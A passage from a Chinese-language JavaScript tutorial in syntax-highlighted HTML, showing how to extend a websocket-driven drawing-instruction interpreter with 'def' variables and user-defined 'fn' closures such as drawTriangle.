    <span class="syntax-symbol">def</span><span class="syntax-operator">:</span> <span class="syntax-open">(</span><span class="syntax-symbol">name</span><span class="syntax-operator">,</span> <span class="syntax-symbol">v</span><span class="syntax-close">)</span> <span class="syntax-operator">=</span><span class="syntax-operator">&gt;</span> <span class="syntax-open">{</span>
      <span class="syntax-symbol">variables</span><span class="syntax-open">[</span><span class="syntax-symbol">name</span><span class="syntax-close">]</span> <span class="syntax-operator">=</span> <span class="syntax-symbol">v</span><span class="syntax-operator">;</span>
    <span class="syntax-close">}</span><span class="syntax-operator">,</span>
  <span class="syntax-close">}</span><span class="syntax-operator">;</span>
  <span class="syntax-special">const</span> <span class="syntax-symbol">parseInstruction</span> <span class="syntax-operator">=</span> <span class="syntax-open">(</span><span class="syntax-symbol">ins</span><span class="syntax-close">)</span> <span class="syntax-operator">=</span><span class="syntax-operator">&gt;</span> <span class="syntax-open">{</span>
    <span class="syntax-special">if</span> <span class="syntax-open">(</span><span class="syntax-symbol">variables</span><span class="syntax-open">[</span><span class="syntax-symbol">ins</span><span class="syntax-close">]</span><span class="syntax-close">)</span> <span class="syntax-open">{</span>
      <span class="syntax-comment">// 这里对应着变量例如 &quot;shape&quot;
</span>      <span class="syntax-special">return</span> <span class="syntax-symbol">variables</span><span class="syntax-open">[</span><span class="syntax-symbol">ins</span><span class="syntax-close">]</span><span class="syntax-operator">;</span>
    <span class="syntax-close">}</span>
    <span class="syntax-special">if</span> <span class="syntax-open">(</span><span class="syntax-operator">!</span><span class="syntax-keyword">Array</span><span class="syntax-operator">.</span><span class="syntax-symbol">isArray</span><span class="syntax-open">(</span><span class="syntax-symbol">ins</span><span class="syntax-close">)</span><span class="syntax-close">)</span> <span class="syntax-open">{</span>
      <span class="syntax-comment">// 这里是原始的参数例如： {x: 0, y: 0}
</span>      <span class="syntax-special">return</span> <span class="syntax-symbol">ins</span><span class="syntax-operator">;</span>
    <span class="syntax-close">}</span>
    <span class="syntax-special">const</span> <span class="syntax-open">[</span><span class="syntax-symbol">fName</span><span class="syntax-operator">,</span> <span class="syntax-operator">...</span><span class="syntax-symbol">args</span><span class="syntax-close">]</span> <span class="syntax-operator">=</span> <span class="syntax-symbol">ins</span><span class="syntax-operator">;</span>
    <span class="syntax-special">return</span> <span class="syntax-symbol">fns</span><span class="syntax-open">[</span><span class="syntax-symbol">fName</span><span class="syntax-close">]</span><span class="syntax-open">(</span><span class="syntax-operator">...</span><span class="syntax-symbol">args</span><span class="syntax-operator">.</span><span class="syntax-symbol">map</span><span class="syntax-open">(</span><span class="syntax-symbol">parseInstruction</span><span class="syntax-close">)</span><span class="syntax-close">)</span><span class="syntax-operator">;</span>
  <span class="syntax-close">}</span><span class="syntax-operator">;</span>
  <span class="syntax-symbol">parseInstruction</span><span class="syntax-open">(</span><span class="syntax-symbol">instruction</span><span class="syntax-close">)</span><span class="syntax-operator">;</span>
<span class="syntax-close">}</span><span class="syntax-close">)</span></code></pre><p>这儿我们引入了一个 <code>variables</code> 对象来跟踪每个我们定义的变量。一个叫 <code>def</code> 的函数会更新这个 <code>variables</code> 变量。
现在我们可以运行像这样的指令：</p><pre><code><span class="syntax-open">[</span>
  <span class="syntax-string">&quot;do&quot;</span><span class="syntax-operator">,</span>
  <span class="syntax-open">[</span><span class="syntax-string">&quot;def&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;shape&quot;</span><span class="syntax-operator">,</span> <span class="syntax-open">[</span><span class="syntax-string">&quot;drawLine&quot;</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span> <span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span> <span class="syntax-close">}</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span> <span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">1</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">1</span> <span class="syntax-close">}</span><span class="syntax-close">]</span><span class="syntax-close">]</span><span class="syntax-operator">,</span>
  <span class="syntax-open">[</span><span class="syntax-string">&quot;rotate&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;shape&quot;</span><span class="syntax-operator">,</span> <span class="syntax-symbol">90</span><span class="syntax-close">]</span><span class="syntax-operator">,</span>
<span class="syntax-close">]</span><span class="syntax-operator">;</span></code></pre><p>不错！</p><h2 id="推向极限：目标">推向极限：目标</h2><p>让我们更进一步，如果我们想让远程用户定义自己的函数呢？</p><p>他们可能会写类似这样的东西：</p><pre><code><span class="syntax-special">const</span> <span class="syntax-symbol">drawTriangle</span> <span class="syntax-operator">=</span> <span class="syntax-special">function</span><span class="syntax-open">(</span><span class="syntax-symbol">left</span><span class="syntax-operator">,</span> <span class="syntax-symbol">top</span><span class="syntax-operator">,</span> <span class="syntax-symbol">right</span><span class="syntax-operator">,</span> <span class="syntax-symbol">color</span><span class="syntax-close">)</span> <span class="syntax-open">{</span>
   <span class="syntax-symbol">drawLine</span><span class="syntax-open">(</span><span class="syntax-symbol">left</span><span class="syntax-operator">,</span> <span class="syntax-symbol">top</span><span class="syntax-operator">,</span> <span class="syntax-symbol">color</span><span class="syntax-close">)</span><span class="syntax-operator">;</span>
   <span class="syntax-symbol">drawLine</span><span class="syntax-open">(</span><span class="syntax-symbol">top</span><span class="syntax-operator">,</span> <span class="syntax-symbol">right</span><span class="syntax-operator">,</span> <span class="syntax-symbol">color</span><span class="syntax-close">)</span><span class="syntax-operator">;</span>
   <span class="syntax-symbol">drawLine</span><span class="syntax-open">(</span><span class="syntax-symbol">left</span><span class="syntax-operator">,</span> <span class="syntax-symbol">right</span><span class="syntax-operator">,</span> <span class="syntax-symbol">color</span><span class="syntax-close">)</span><span class="syntax-operator">;</span>
<span class="syntax-close">}</span>
<span class="syntax-symbol">drawTriangle</span><span class="syntax-open">(</span><span class="syntax-operator">...</span><span class="syntax-close">)</span></code></pre><p>我们要怎么做？让我们再次跟随直觉，将这些转换成我们的数据结构，看起来类似这样：</p><pre><code><span class="syntax-open">[</span><span class="syntax-string">&quot;def&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;drawTriangle&quot;</span><span class="syntax-operator">,</span>
  <span class="syntax-open">[</span><span class="syntax-string">&quot;fn&quot;</span><span class="syntax-operator">,</span> <span class="syntax-open">[</span><span class="syntax-string">&quot;left&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;top&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;right&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;color&quot;</span><span class="syntax-close">]</span><span class="syntax-operator">,</span>
    <span class="syntax-open">[</span><span class="syntax-string">&quot;do&quot;</span><span class="syntax-operator">,</span>
      <span class="syntax-open">[</span><span class="syntax-string">&quot;drawLine&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;left&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;top&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;color&quot;</span><span class="syntax-close">]</span><span class="syntax-operator">,</span>
      <span class="syntax-open">[</span><span class="syntax-string">&quot;drawLine&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;top&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;right&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;color&quot;</span><span class="syntax-close">]</span><span class="syntax-operator">,</span>
      <span class="syntax-open">[</span><span class="syntax-string">&quot;drawLine&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;left&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;right&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;color&quot;</span><span class="syntax-close">]</span><span class="syntax-operator">,</span>
    <span class="syntax-close">]</span><span class="syntax-operator">,</span>
  <span class="syntax-close">]</span><span class="syntax-operator">,</span>
<span class="syntax-close">]</span><span class="syntax-operator">,</span>
<span class="syntax-open">[</span><span class="syntax-string">&quot;drawTriangle&quot;</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span> <span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span> <span class="syntax-close">}</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span> <span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">3</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">3</span> <span class="syntax-close">}</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span> <span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">6</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span> <span class="syntax-close">}</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;blue&quot;</span><span class="syntax-close">]</span><span class="syntax-operator">,</span></code></pre><p>这里</p><pre><code><span class="syntax-special">const</span> <span class="syntax-symbol">drawTriangle</span> <span class="syntax-operator">=</span> <span class="syntax-operator">...</span></code></pre><p>会转成</p><pre><code><span class="syntax-open">[</span><span class="syntax-string">&quot;def&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;drawTriangle&quot;</span><span class="syntax-operator">,</span> …]</code></pre><p>而且</p><pre><code><span class="syntax-special">function</span><span class="syntax-open">(</span><span class="syntax-symbol">left</span><span class="syntax-operator">,</span> <span class="syntax-symbol">top</span><span class="syntax-operator">,</span> <span class="syntax-symbol">right</span><span class="syntax-operator">,</span> <span class="syntax-symbol">color</span><span class="syntax-close">)</span> <span class="syntax-open">{</span>…}</code></pre><p>会转成</p><pre><code><span class="syntax-open">[</span><span class="syntax-string">&quot;fn&quot;</span><span class="syntax-operator">,</span> <span class="syntax-open">[</span><span class="syntax-string">&quot;left&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;top&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;right&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;color&quot;</span><span class="syntax-close">]</span><span class="syntax-operator">,</span>
<span class="syntax-open">[</span><span class="syntax-string">&quot;do&quot;</span> <span class="syntax-operator">...</span><span class="syntax-close">]</span><span class="syntax-close">]</span></code></pre><p>我们需要以某种方式解析这些指令，然后，嘣，我们就能大功告成了！</p><h2 id="推向极限：关键">推向极限：关键</h2><p>实现上面关键在于 <code>[&quot;fn&quot;, …]</code> 指令，如果我们这样做：</p><pre><code><span class="syntax-special">const</span> <span class="syntax-symbol">parseFnInstruction</span> <span class="syntax-operator">=</span> <span class="syntax-open">(</span><span class="syntax-symbol">args</span><span class="syntax-operator">,</span> <span class="syntax-symbol">body</span><span class="syntax-operator">,</span> <span class="syntax-symbol">oldVariables</span><span class="syntax-close">)</span> <span class="syntax-operator">=</span><span class="syntax-operator">&gt;</span> <span class="syntax-open">{</span>
  <span class="syntax-special">return</span> <span class="syntax-open">(</span><span class="syntax-operator">...</span><span class="syntax-symbol">values</span><span class="syntax-close">)</span> <span class="syntax-operator">=</span><span class="syntax-operator">&gt;</span> <span class="syntax-open">{</span>
    <span class="syntax-special">const</span> <span class="syntax-symbol">newVariables</span> <span class="syntax-operator">=</span> <span class="syntax-open">{</span>
      <span class="syntax-operator">...</span><span class="syntax-symbol">oldVariables</span><span class="syntax-operator">,</span>
      <span class="syntax-operator">...</span><span class="syntax-symbol">mapArgsWithValues</span><span class="syntax-open">(</span><span class="syntax-symbol">args</span><span class="syntax-operator">,</span> <span class="syntax-symbol">values</span><span class="syntax-close">)</span><span class="syntax-operator">,</span>
    <span class="syntax-close">}</span><span class="syntax-operator">;</span>
    <span class="syntax-special">return</span> <span class="syntax-symbol">parseInstruction</span><span class="syntax-open">(</span><span class="syntax-symbol">body</span><span class="syntax-operator">,</span> <span class="syntax-symbol">newVariables</span><span class="syntax-close">)</span><span class="syntax-operator">;</span>
  <span class="syntax-close">}</span><span class="syntax-operator">;</span>
<span class="syntax-close">}</span><span class="syntax-operator">;</span></code></pre><p>当我们找到 <code>fn</code> 指令时，我们会运行 <code>parseFnInstruction</code> 。这会产生一个新的 javascript 函数，
并将 <code>drawTriangle</code> 替换成这样：</p><pre><code><span class="syntax-open">[</span><span class="syntax-string">&quot;drawTriangle&quot;</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span> <span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span> <span class="syntax-close">}</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span> <span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">3</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">3</span> <span class="syntax-close">}</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span> <span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">6</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span> <span class="syntax-close">}</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;blue&quot;</span><span class="syntax-close">]</span></code></pre><p>当函数运行时 <code>values</code> 将变成：</p><pre><code><span class="syntax-open">[</span><span class="syntax-open">{</span> <span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span> <span class="syntax-close">}</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span> <span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">3</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">3</span> <span class="syntax-close">}</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span> <span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">6</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span> <span class="syntax-close">}</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;blue&quot;</span><span class="syntax-close">]</span></code></pre><p>之后</p><pre><code><span class="syntax-special">const</span> <span class="syntax-symbol">newVariables</span> <span class="syntax-operator">=</span> <span class="syntax-open">{</span><span class="syntax-operator">...</span><span class="syntax-symbol">oldVariables</span><span class="syntax-operator">,</span> <span class="syntax-operator">...</span><span class="syntax-symbol">mapArgsWithValues</span><span class="syntax-open">(</span><span class="syntax-symbol">args</span><span class="syntax-operator">,</span> <span class="syntax-symbol">values</span><span class="syntax-close">)</span><span class="syntax-close">}</span></code></pre><p>会创建一个新的 <code>variables</code> 对象，包含函数参数和最新的映射值：</p><pre><code><span class="syntax-special">const</span> <span class="syntax-symbol">newVariables</span> <span class="syntax-operator">=</span> <span class="syntax-open">{</span>
  <span class="syntax-operator">...</span><span class="syntax-symbol">oldVariables</span><span class="syntax-operator">,</span>
  <span class="syntax-symbol">left</span><span class="syntax-operator">:</span> <span class="syntax-open">{</span> <span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span> <span class="syntax-close">}</span><span class="syntax-operator">,</span>
  <span class="syntax-symbol">top</span><span class="syntax-operator">:</span> <span class="syntax-open">{</span> <span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">3</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">3</span> <span class="syntax-close">}</span><span class="syntax-operator">,</span>
  <span class="syntax-symbol">right</span><span class="syntax-operator">:</span> <span class="syntax-open">{</span><span class="syntax-symbol">x</span><span class="syntax-operator">:</span> <span class="syntax-symbol">6</span><span class="syntax-operator">,</span> <span class="syntax-symbol">y</span><span class="syntax-operator">:</span> <span class="syntax-symbol">0</span> <span class="syntax-close">}</span><span class="syntax-operator">,</span>
  <span class="syntax-symbol">color</span><span class="syntax-operator">:</span> <span class="syntax-string">&quot;blue&quot;</span><span class="syntax-operator">,</span>
<span class="syntax-close">}</span></code></pre><p>然后，我们可以去获取函数体，在这是：</p><pre><code>      <span class="syntax-open">[</span>
        <span class="syntax-string">&quot;do&quot;</span><span class="syntax-operator">,</span>
        <span class="syntax-open">[</span><span class="syntax-string">&quot;drawLine&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;left&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;top&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;color&quot;</span><span class="syntax-close">]</span><span class="syntax-operator">,</span>
        <span class="syntax-open">[</span><span class="syntax-string">&quot;drawLine&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;top&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;right&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;color&quot;</span><span class="syntax-close">]</span><span class="syntax-operator">,</span>
        <span class="syntax-open">[</span><span class="syntax-string">&quot;drawLine&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;left&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;right&quot;</span><span class="syntax-operator">,</span> <span class="syntax-string">&quot;color&quot;</span><span class="syntax-close">]</span><span class="syntax-operator">,</span>
      <span class="syntax-close">]</span><span class="syntax-operator">,</span></code></pre><p>这样 <code>parseInstruction</code> 在运行时就可以在 <code>newVariables</code> 里将 &quot;left&quot; 视作变量并获取到值 <code>{x: 0, y: 0}</code> 。</p><p>如果我们做到了，函数功能的主要部分就完成了！</p><h2 id="推向极限：执行">推向极限：执行</h2><p>让我们回想一下计划，首先要做的事是得让 <code>parseInstruction</code> 接收 <code>variables</code> 作为一个参数。为此我们得
先更新 <code>parseInstruction</code> ：</p><pre><code>  <span class="syntax-special">const</span> <span class="syntax-symbol">parseInstruction</span> <span class="syntax-operator">=</span> <span class="syntax-open">(</span><span class="syntax-symbol">ins</span><span class="syntax-operator">,</span> <span class="syntax-symbol">variables</span><span class="syntax-close">)</span> <span class="syntax-operator">=</span><span class="syntax-operator">&gt;</span> <span class="syntax-open">{</span>
    <span class="syntax-operator">...</span>
    <span class="syntax-special">return</span> <span class="syntax-symbol">fn</span><span class="syntax-open">(</span><span class="syntax-operator">...</span><span class="syntax-symbol">args</span><span class="syntax-operator">.</span><span class="syntax-symbol">map</span><span class="syntax-open">(</span><span class="syntax-open">(</span><span class="syntax-symbol">arg</span><span class="syntax-close">)</span> <span class="syntax-operator">=</span><span class="syntax-operator">&gt;</span> <span class="syntax-symbol">parseInstruction</span><span class="syntax-open">(</span><span class="syntax-symbol">arg</span><span class="syntax-operator">,</span> <span class="syntax-symbol">variables</span><span class="syntax-close">)</span><span class="syntax-close">)</span><span class="syntax-close">)</span><span class="syntax-operator">;</span>
  <span class="syntax-close">}</span><span class="syntax-operator">;</span>
  <span class="syntax-symbol">parseInstruction</span><span class="syntax-open">(</span><span class="syntax-symbol">instruction</span><span class="syntax-operator">,</span> <span class="syntax-symbol">variables</span><span class="syntax-close">)</span><span class="syntax-operator">;</span></code></pre><p>接下来我们去检测这个 &quot;fn&quot; 指令：</p><pre><code>  <span class="syntax-special">const</span> <span class="syntax-symbol">parseInstruction</span> <span class="syntax-operator">=</span> <span class="syntax-open">(</span><span class="syntax-symbol">ins</span><span class="syntax-operator">,</span> <span class="syntax-symbol">variables</span><span class="syntax-close">)</span> <span class="syntax-operator">=</span><span class="syntax-operator">&gt;</span> <span class="syntax-open">{</span>
    <span class="syntax-operator">...</span>
    <span class="syntax-special">const</span> <span class="syntax-open">[</span><span class="syntax-symbol">fName</span><span class="syntax-operator">,</span> <span class="syntax-operator">...</span><span class="syntax-symbol">args</span><span class="syntax-close">]</span> <span class="syntax-operator">=</span> <span class="syntax-symbol">ins</span><span class="syntax-operator">;</span>
    <span class="syntax-special">if</span> <span class="syntax-open">(</span><span class="syntax-symbol">fName</span> <span class="syntax-operator">==</span> <span class="syntax-string">&quot;fn&quot;</span><span class="syntax-close">)</span> <span class="syntax-open">{</span>
      <span class="syntax-special">return</span> <span class="syntax-symbol">parseFnInstruction</span><span class="syntax-open">(</span><span class="syntax-operator">...</span><span class="syntax-symbol">args</span><span class="syntax-operator">,</span> <span class="syntax-symbol">variables</span><span class="syntax-close">)</span><span class="syntax-operator">;</span>
    <span class="syntax-close">}</span>
    <span class="syntax-operator">...</span>
    <span class="syntax-special">return</span> <span class="syntax-symbol">fn</span><span class="syntax-open">(</span><span class="syntax-operator">...</span><span class="syntax-symbol">args</span><span class="syntax-operator">.</span><span class="syntax-symbol">map</span><span class="syntax-open">(</span><span class="syntax-open">(</span><span class="syntax-symbol">arg</span><span class="syntax-close">)</span> <span class="syntax-operator">=</span><span class="syntax-operator">&gt;</span> <span class="syntax-symbol">parseInstruction</span><span class="syntax-open">(</span><span class="syntax-symbol">arg</span><span class="syntax-operator">,</span> <span class="syntax-symbol">variables</span><span class="syntax-close">)</span><span class="syntax-close">)</span><span class="syntax-close">)</span><span class="syntax-operator">;</span>
  <span class="syntax-close">}</span><span class="syntax-operator">;</span>
  <span class="syntax-symbol">parseInstruction</span><span class="syntax-open">(</span><span class="syntax-symbol">instruction</span><span class="syntax-operator">,</span> <span class="syntax-symbol">variables</span><span class="syntax-close">)</span><span class="syntax-operator">;</span></code></pre><p>现在，我们的 <code>parseFnInstruction</code> ：</p><pre><code><span class="syntax-special">const</span> <span class="syntax-symbol">mapArgsWithValues</span> <span class="syntax-operator">=</span> <span class="syntax-open">(</span><span class="syntax-symbol">args</span><span class="syntax-operator">,</span> <span class="syntax-symbol">values</span><span class="syntax-close">)</span> <span class="syntax-operator">=</span><span class="syntax-operator">&gt;</span> <span class="syntax-open">{</span>
  <span class="syntax-special">return</span> <span class="syntax-symbol">args</span><span class="syntax-operator">.</span><span class="syntax-symbol">reduce</span><span class="syntax-open">(</span><span class="syntax-open">(</span><span class="syntax-symbol">res</span><span class="syntax-operator">,</span> <span class="syntax-symbol">k</span><span class="syntax-operator">,</span> <span class="syntax-symbol">idx</span><span class="syntax-close">)</span> <span class="syntax-operator">=</span><span class="syntax-operator">&gt;</span> <span class="syntax-open">{</span>
    <span class="syntax-symbol">res</span><span class="syntax-open">[</span><span class="syntax-symbol">k</span><span class="syntax-close">]</span> <span class="syntax-operator">=</span> <span class="syntax-symbol">values</span><span class="syntax-open">[</span><span class="syntax-symbol">idx</span><span class="syntax-close">]</span><span class="syntax-operator">;</span>
    <span class="syntax-special">return</span> <span class="syntax-symbol">res</span><span class="syntax-operator">;</span>
  <span class="syntax-close">}</span><span class="syntax-operator">,</span> <span class="syntax-open">{</span><span class="syntax-close">}</span><span class="syntax-close">)</span><span class="syntax-operator">;</span>
<span class="syntax-close">}</span>
<span class="syntax-special">const</span> <span class="syntax-symbol">parseFnInstruction</span> <span class="syntax-operator">=</span> <span class="syntax-open">(</span><span class="syntax-symbol">args</span><span class="syntax-operator">,</span> <span class="syntax-symbol">body</span><span class="syntax-operator">,</span> <span class="syntax-symbol">oldVariables</span><span class="syntax-close">)</span> <span class="syntax-operator">=</span><span class="syntax-operator">&gt;</span> <span class="syntax-open">{</span>
  <span class="syntax-special">return</span> <span class="syntax-open">(</span><span class="syntax-operator">...</span><span class="syntax-symbol">values</span><span class="syntax-close">)</span> <span class="syntax-operator">=</span><span class="syntax-operator">&gt;</span> <span class="syntax-open">{</span>
    <span class="syntax-special">const</span> <span class="syntax-symbol">newVariables</span> <span class="syntax-operator">=</span> <span class="syntax-open">{</span><span class="syntax-operator">...</span><span class="syntax-symbol">oldVariables</span><span class="syntax-operator">,</span> <span class="syntax-operator">...</span><span class="syntax-symbol">mapArgsWithValues</span><span class="syntax-open">(</span><span class="syntax-symbol">args</span><span class="syntax-operator">,</span> <span class="syntax-symbol">values</span><span class="syntax-close">)</span><span class="syntax-close">}</span>
    <span class="syntax-special">return</span> <span class="syntax-symbol">parseInstruction</span><span class="syntax-open">(</span><span class="syntax-symbol">body</span><span class="syntax-operator">,</span> <span class="syntax-symbol">newVariables</span><span class="syntax-close">)</span><span class="syntax-operator">;</span>
  <span class="syntax-close">}</span><span class="syntax-operator">;</span>
<span class="syntax-close">}</span><span class="syntax-operator">;</span></code></pre><p>就完全按照我们想的一样，当运行时返回一个新的函数：</p><ol><li>创建一个新的 <code>newVariables</code> 对象，将 <code>args</code> 和 <code>values</code> 关联。</li><li>将 <code>body</code> 和新的 <code>variables</code> 传入 <code>parseInstruction</code> 运行。</li></ol><p>好的，差不多了。还差最后一点让一切跑起来：</p><pre><code>  <span class="syntax-special">const</span> <span class="syntax-symbol">parseInstruction</span> <span class="syntax-operator">=</span> <span class="syntax-open">(</span><span class="syntax-symbol">ins</span><span class="syntax-operator">,</span> <span class="syntax-symbol">variables</span><span class="syntax-close">)</span> <span class="syntax-operator">=</span><span class="syntax-operator">&gt;</span> <span class="syntax-open">{</span>
    <span class="syntax-operator">...</span>
    <span class="syntax-special">const</span> <span class="syntax-open">[</span><span class="syntax-symbol">fName</span><span class="syntax-operator">,</span> <span class="syntax-operator">...</span><span class="syntax-symbol">args</span><span class="syntax-close">]</span> <span class="syntax-operator">=</span> <span class="syntax-symbol">ins</span><span class="syntax-operator">;</span>
    <span class="syntax-special">if</span> <span class="syntax-open">(</span><span class="syntax-symbol">fName</span> <span class="syntax-operator">==</span> <span class="syntax-string">&quot;fn&quot;</span><span class="syntax-close">)</span> <span class="syntax-open">{</span>
      <span class="syntax-special">return</span> <span class="syntax-symbol">parseFnInstruction</span><span class="syntax-open">(</span><span class="syntax-operator">...</span><span class="syntax-symbol">args</span><span class="syntax-operator">,</span> <span class="syntax-symbol">variables</span><span class="syntax-close">)</span><span class="syntax-operator">;</span>
    <span class="syntax-close">}</span>
    <span class="syntax-special">const</span> <span class="syntax-symbol">fn</span> <span class="syntax-operator">=</span> <span class="syntax-symbol">fns</span><span class="syntax-open">[</span><span class="syntax-symbol">fName</span><span class="syntax-close">]</span> <span class="syntax-operator">||</span> <span class="syntax-symbol">variables</span><span class="syntax-open">[</span><span class="syntax-symbol">fName</span><span class="syntax-close">]</span><span class="syntax-operator">;</span>
    <span class="syntax-special">return</span> <span class="syntax-symbol">fn</span><span class="syntax-open">(</span><span class="syntax-operator">...</span><span class="syntax-symbol">args</span><span class="syntax-operator">.</span><span class="syntax-symbol">map</span><span class="syntax-open">(</span><span class="syntax-open">(</span><span class="syntax-symbol">arg</span><span class="syntax-close">)</span> <span class="syntax-operator">=</span><span class="syntax-operator">&gt;</span> <span class="syntax-symbol">parseInstruction</span><span class="syntax-open">(</span><span class="syntax-symbol">arg</span><span class="syntax-operator">,</span> <span class="syntax-symbol">variables</span><span class="syntax-close">)</span><span class="syntax-close">)</span><span class="syntax-close">)</span><span class="syntax-operator">;</span></code></pre><p>秘密在于：</p><pre><code>    <span class="syntax-special">const</span> <span class="syntax-symbol">fn</span> <span class="syntax-operator">=</span> <span class="syntax-symbol">fns</span><span class="syntax-open">[</span><span class="syntax-symbol">fName</span><span class="syntax-close">]</span> <span class="syntax-operator">||</span> <span class="syntax-symbol">variables</span><span class="syntax-open">[</span><span class="syntax-symbol">fName</span><span class="syntax-close">]</span><span class="syntax-operator">;</span></code></pre><p>这里由于 <code>fn</code> 现在可以同时来源于 <code>fns</code> 和 <code>variables</code> ，让我们同时支持两者，然后能用了！</p><pre><code><span class="syntax-symbol">websocket</span><span class="syntax-operator">.</span><span class="syntax-symbol">onMessage</span><span class="syntax-open">(</span><span class="syntax-symbol">data</span> <span class="syntax-operator">=</span><span class="syntax-operator">&gt;</span> <span class="syntax-open">{</span>
  <span class="syntax-special">const</span> <span class="syntax-symbol">variables</span> <span class="syntax-operator">=</span> <span class="syntax-open">{</span><span class="syntax-close">}</span><span class="syntax-operator">;</span>
  <span class="syntax-special">const</span> <span class="syntax-symbol">fns</span> <span class="syntax-operator">=</span> <span class="syntax-open">{</span>
    <span class="syntax-symbol">drawLine</span><span class="syntax-operator">:</span> <span class="syntax-symbol">drawLine</span><span class="syntax-operator">,</span>
    <span class="syntax-symbol">drawPoint</span><span class="syntax-operator">:</span> <span class="syntax-symbol">drawPoint</span><span class="syntax-operator">,</span>
    <span class="syntax-symbol">rotate</span><span class="syntax-operator">:</span> <span class="syntax-symbol">rotate</span><span class="syntax-operator">,</span>
    <span class="syntax-special">do</span><span class="syntax-operator">:</span> <span class="syntax-open">(</span><span class="syntax-operator">...</span><span class="syntax-symbol">args</span><span class="syntax-close">)</span> <span class="syntax-operator">=</span><span class="syntax-operator">&gt;</span> <span class="syntax-symbol">args</span><span class="syntax-open">[</span><span class="syntax-symbol">args</span><span class="syntax-operator">.</span><span class="syntax-symbol">length</span> <span class="syntax-operator">-</span> <span class="syntax-symbol">1</span><span class="syntax-close">]</span><span class="syntax-operator">,</span>
    <span class="syntax-symbol">def</span><span class="syntax-operator">:</span> <span class="syntax-open">(</span><span class="syntax-symbol">name</span><span class="syntax-operator">,</span> <span class="syntax-symbol">v</span><span class="syntax-close">)</span> <span class="syntax-operator">=</span><span class="syntax-operator">&gt;</span> <span class="syntax-open">{</span>
